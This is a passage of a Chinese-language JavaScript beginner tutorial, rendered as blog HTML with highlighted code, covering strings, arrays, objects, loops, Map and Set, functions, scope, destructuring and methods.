class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//+号</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"xiao\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">123</span>+name);</span><br><span class=\"line\"><span class=\"comment\">//$&#123;&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"xiao\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">`123<span class=\"subst\">$&#123;name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>操作字符串</strong></p>\n<blockquote>\n<p>字符串是不可改变的，无论之后赋值，都不会改变。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"string\">\"a\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s.length); <span class=\"comment\">//长度</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(s[<span class=\"number\">0</span>]); <span class=\"comment\">//输出</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h2><p>JavaScript的<code>Array</code>可以包含任意数据类型，并通过索引来访问每个元素。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\">arr.length;</span><br><span class=\"line\">arr.length = <span class=\"number\">6</span>; <span class=\"comment\">//可以通过给length赋值，改变数组的大小</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h2><p>JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiao=&#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'xiao'</span>,</span><br><span class=\"line\">\tage: <span class=\"number\">18</span>,</span><br><span class=\"line\">\t<span class=\"string\">'school'</span>: <span class=\"string\">'No.1'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao.name)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao[<span class=\"string\">'name'</span>])  <span class=\"comment\">//两种都可以访问xiao的name值</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(xiao[<span class=\"string\">'school'</span>])</span><br></pre></td></tr></table></figure>\n<p>由于JavaScript的对象是动态类型，你可以自由地给一个对象添加或删除属性.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xiao=&#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'xiao'</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xiao.age=<span class=\"number\">18</span>;</span><br><span class=\"line\">alert(xiao.age);</span><br><span class=\"line\"><span class=\"keyword\">delete</span> xiao.age</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//可以用hasOwnProperty()方法来判断属性是否是自身拥有的</span></span><br><span class=\"line\">xiao.hasOwnProperty(<span class=\"string\">'name'</span>) <span class=\"comment\">//true</span></span><br><span class=\"line\">xiao.hasOwnProperty(<span class=\"string\">'age'</span>) <span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"条件判断\"><a href=\"#条件判断\" class=\"headerlink\" title=\"条件判断\"></a>条件判断</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;单个判断</span><br><span class=\"line\">if(...)&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#x2F;&#x2F;多行条件判断</span><br><span class=\"line\">\tif()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;else if()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JavaScript把<code>null</code>、<code>undefined</code>、<code>0</code>、<code>NaN</code>和空字符串<code>&#39;&#39;</code>视为<code>false</code>，其他值一概视为<code>true</code>.</p>\n<h2 id=\"循环\"><a href=\"#循环\" class=\"headerlink\" title=\"循环\"></a>循环</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for(;;)&#123;</span><br><span class=\"line\">\t...;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>for循环最常用的地方就是遍历数组</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> i;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(arr[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"for-in\"><a href=\"#for-in\" class=\"headerlink\" title=\"for in\"></a><strong>for in</strong></h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> o = &#123;</span><br><span class=\"line\">\tname: <span class=\"string\">'bob'</span>,</span><br><span class=\"line\">\tage: <span class=\"number\">18</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> o)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(key);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(o[key]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//name age</span></span><br><span class=\"line\"><span class=\"comment\">//bob 18</span></span><br><span class=\"line\"><span class=\"comment\">//同样，数组中也可以用for...in</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = [<span class=\"string\">'A'</span>,<span class=\"string\">'B'</span>,<span class=\"string\">'C'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> a)&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//A  B  C</span></span><br></pre></td></tr></table></figure>\n<p><strong>while</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(...)&#123;</span><br><span class=\"line\">\t...;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>do…while</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;while(...)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Map和Set\"><a href=\"#Map和Set\" class=\"headerlink\" title=\"Map和Set\"></a>Map和Set</h2><p>JavaScript的默认对象表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组键值对。</p>\n<p>但是JavaScript的对象有个小问题，就是键必须是字符串。<strong>但实际上Number或者其他数据类型作为键也是非常合理的。</strong></p>\n<h3 id=\"Map\"><a href=\"#Map\" class=\"headerlink\" title=\"Map\"></a><strong>Map</strong></h3><p><code>Map</code>是一组键值对的结构，具有极快的查找速度。</p>\n<p>初始化<code>Map</code>需要一个<strong>二维数组</strong>，或者直接初始化一个空<code>Map</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Map初始化</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> m = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>();</span><br><span class=\"line\"><span class=\"comment\">//增</span></span><br><span class=\"line\">m.set(<span class=\"string\">'Bob'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">m.set(<span class=\"string\">'Pz1o'</span>,<span class=\"number\">99</span>);</span><br><span class=\"line\"><span class=\"comment\">//删</span></span><br><span class=\"line\">m.delete(<span class=\"string\">'Bob'</span>);</span><br><span class=\"line\"><span class=\"comment\">//查</span></span><br><span class=\"line\">m.has(<span class=\"string\">'Pz1o'</span>); <span class=\"comment\">//true</span></span><br><span class=\"line\">m.get(<span class=\"string\">'Pz1o'</span>); <span class=\"comment\">//99</span></span><br></pre></td></tr></table></figure>\n<p>注意：一个key只能对应一个value，重复定义后面的值会覆盖掉前面的值。</p>\n<hr>\n<h3 id=\"Set\"><a href=\"#Set\" class=\"headerlink\" title=\"Set\"></a>Set</h3><p><code>Set</code>和<code>Map</code>类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在<code>Set</code>中，没有重复的key。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//set初始化</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"comment\">//重复元素会被自动过滤</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"comment\">//增</span></span><br><span class=\"line\">s.add(<span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"comment\">//删</span></span><br><span class=\"line\">s,<span class=\"keyword\">delete</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"comment\">//查</span></span><br><span class=\"line\">s;</span><br></pre></td></tr></table></figure>\n<h2 id=\"iterable\"><a href=\"#iterable\" class=\"headerlink\" title=\"iterable\"></a>iterable</h2><p>遍历<code>Array</code>可以采用下标循环，遍历<code>Map</code>和<code>Set</code>就无法使用下标。为了统一集合类型，ES6标准引入了新的<code>iterable</code>类型，<code>Array</code>、<code>Map</code>和<code>Set</code>都属于<code>**iterable</code>类型。**</p>\n<p><strong>具有<code>iterable</code>类型的集合可以通过新的<code>for ... of</code>循环来遍历。</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> s = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"keyword\">var</span> m = <span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>([[<span class=\"string\">'A'</span>,<span class=\"string\">'a'</span>],[<span class=\"string\">'Y'</span>,<span class=\"string\">'y'</span>]]);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> a)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> s)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//1  2  3</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i <span class=\"keyword\">of</span> m)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//[\"A\",\"a\"]  [\"Y\",\"y\"]</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>for...in</code>和<code>for...of</code>的不同点：</p>\n<p><code>for...in</code>会遍历对象的所有属性名称，一个<code>Array</code>数组实际上也是一个对象，它的每个元素的索引被视为一个属性。</p>\n<p><code>for...of</code>则修复了这些问题，它只遍历循环集合的本身元素。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;forEach函数同样可以用来遍历</span><br><span class=\"line\">var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];</span><br><span class=\"line\">a.forEach(function(value,index,a)&#123;</span><br><span class=\"line\">\tconsole.log(value+&#39;,&#39;+index);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&#x2F;&#x2F;A,0  B,1  C,2</span><br><span class=\"line\">forEach(值,键,自身)</span><br></pre></td></tr></table></figure>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><h2 id=\"函数定义和调用\"><a href=\"#函数定义和调用\" class=\"headerlink\" title=\"函数定义和调用\"></a>函数定义和调用</h2><p><strong>定义函数</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abs</span>(<span class=\"params\">...</span>)</span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//function 指明是函数的定义</span></span><br><span class=\"line\"><span class=\"comment\">//abs是函数名称</span></span><br><span class=\"line\"><span class=\"comment\">//(...)里面是参数</span></span><br><span class=\"line\"><span class=\"comment\">//&#123;...&#125;是函数体</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//另一种定义方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> abs = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">..</span>)</span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//在这种方式下，function(x)&#123; ... &#125;是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。</span></span><br></pre></td></tr></table></figure>\n<p>请注意，函数体内部的语句在执行时，一旦执行到<code>return</code>时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。</p>\n<p>如果没有<code>return</code>语句，函数执行完毕后也会返回结果，只是结果为<code>undefined</code>。</p>\n<hr>\n<p><strong>调用函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">abs(10);</span><br><span class=\"line\">abs(10,111);  &#x2F;&#x2F;返回10</span><br><span class=\"line\">abs();     &#x2F;&#x2F;返回NaN</span><br></pre></td></tr></table></figure>\n<p>由于JavaScript允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题。</p>\n<hr>\n<p><strong>arguments</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//arguments(伪数组)</span></span><br><span class=\"line\"><span class=\"comment\">//存储了用户的所有实参</span></span><br><span class=\"line\"><span class=\"comment\">//伪数组 有length属性 是按照索引存储的</span></span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)  <span class=\"comment\">//arguments的数组就是1 2 3</span></span><br></pre></td></tr></table></figure>\n<p>实际上<code>arguments</code>最常用于判断传入参数的个数,以此来判断缺失参数。</p>\n<hr>\n<p><strong>rest</strong></p>\n<p>由于js中会接受接受多余的参数，所以用一个rest数组来表示多余的参数。rest参数只能写在最后，前面用<code>...</code>标识。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">a,b,...rest</span>)</span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(rest);</span><br><span class=\"line\"><span class=\"keyword\">return</span> a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);  <span class=\"comment\">//[3]</span></span><br><span class=\"line\">fn(<span class=\"number\">1</span>,<span class=\"number\">2</span>)     <span class=\"comment\">//[]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"变量作用域与解构赋值\"><a href=\"#变量作用域与解构赋值\" class=\"headerlink\" title=\"变量作用域与解构赋值\"></a>变量作用域与解构赋值</h2><p>如果一个变量在函数体内部申明，则该变量的作用域为整个函数体，在函数体外不可引用该变量。</p>\n<p>如果两个不同的函数各自申明了同一个变量，那么该变量只在各自的函数体内起作用。换句话说，不同函数内部的同名变量互相独立，互不影响。</p>\n<hr>\n<p><strong>全局作用域</strong></p>\n<p>不在任何函数内定义的变量就具有全局作用域。实际上，JavaScript默认有一个全局对象<code>window</code>，全局作用域的变量实际上被绑定到<code>window</code>的一个属性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"string\">'A'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">window</span>.a);</span><br></pre></td></tr></table></figure>\n<p>同样的，函数也是一个变量，也会绑定到<code>windows</code>对象。任何变量（函数也视为变量），如果没有在当前函数作用域中找到，就会继续往上查找，最后如果在全局作用域中也没有找到，则报<code>ReferenceError</code>错误。</p>\n<hr>\n<p><strong>名字空间</strong></p>\n<p>全局变量会绑定到<code>window</code>上，不同的JavaScript文件如果使用了相同的全局变量，或者定义了相同名字的顶层函数，都会造成命名冲突，并且很难被发现。<strong>减少冲突的一个方法是把自己的所有变量和函数全部绑定到一个全局变量中。</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Ma = <span class=\"number\">0</span>;</span><br><span class=\"line\">Ma.name = <span class=\"string\">\"xiaoming\"</span>;</span><br><span class=\"line\">Ma.fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> ....</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>局部作用域</strong></p>\n<p>为了解决块级作用域，ES6引入了新的关键字<code>let</code>，用<code>let</code>替代<code>var</code>可以申明一个块级作用域的变量。</p>\n<p><strong>常量</strong></p>\n<p>ES6标准引入了新的关键字<code>const</code>来定义常量，<code>const</code>与<code>let</code>都具有块级作用域。</p>\n<p><strong>解构赋值</strong></p>\n<p>解构赋值就是同时对一组变量进行赋值。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> [x, y, z] = [<span class=\"string\">'hello'</span>, <span class=\"string\">'JavaScript'</span>, <span class=\"string\">'ES6'</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);</span><br></pre></td></tr></table></figure>\n<p>如果需要从一个对象中取出若干属性，也可以使用解构赋值，便于快速获取对象的指定属性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">    name : <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\t\tage : <span class=\"number\">18</span>,</span><br><span class=\"line\">\t\tuniversity : &#123;</span><br><span class=\"line\">\t\t\t\tspecialities : <span class=\"string\">'cs'</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//直接赋值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;name,age&#125; = person;</span><br><span class=\"line\"><span class=\"comment\">//嵌套对象的赋值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;<span class=\"attr\">university</span> : &#123;specialities&#125;&#125; = person;</span><br><span class=\"line\"><span class=\"comment\">//如果想要的变量和对象的属性名不一样，可以如下操作</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> &#123;<span class=\"attr\">name</span>:mz&#125; = person;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用场景：解构赋值在很多时候可以大大简化代码。例如，交换两个变量<code>x</code>和<code>y</code>的值，可以这么写，不再需要临时变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var x &#x3D; 1,y &#x3D; 2;</span><br><span class=\"line\">[x , y] &#x3D; [y ,x];</span><br></pre></td></tr></table></figure>\n<p>如果一个函数接收一个对象作为参数，那么，可以使用解构直接把对象的属性绑定到变量中。</p>\n</blockquote>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>在一个对象中绑定函数，称为这个对象的方法。</p>\n<p>在一个方法内部，<code>this</code>是一个特殊变量，它始终指向当前对象，也就是<code>xiaoming</code>这个变量。所以，<code>this.birth</code>可以拿到<code>xiaoming</code>的<code>birth</code>属性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getAge</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> y = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getFullYear();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y - <span class=\"keyword\">this</span>.birth;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">'小明'</span>,</span><br><span class=\"line\">    birth: <span class=\"number\">1990</span>,</span><br><span class=\"line\">    age: getAge</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">xiaoming.age(); <span class=\"comment\">// 30, 正常结果</span></span><br><span class=\"line\">getAge(); <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n<p>如果以对象的方法形式调用，比如<code>xiaoming.age()</code>，该函数的<code>this</code>指向被调用的对象，也就是<code>xiaoming</code>，这是符合我们预期的。</p>\n<p>如果单独调用函数，比如<code>getAge()</code>，此时，该函数的<code>this</code>指向全局对象，也就是<code>window</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‘use strict’;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = &#123;</span><br><span class=\"line\">\tname : <span class=\"string\">'xiaoming'</span>,</span><br><span class=\"line\">\tage : <span class=\"number\">18</span>,</span><br><span class=\"line\">\tmath : <span class=\"number\">90</span>,</span><br><span class=\"line\">\ten : <span class=\"number\">99</span>,</span><br><span 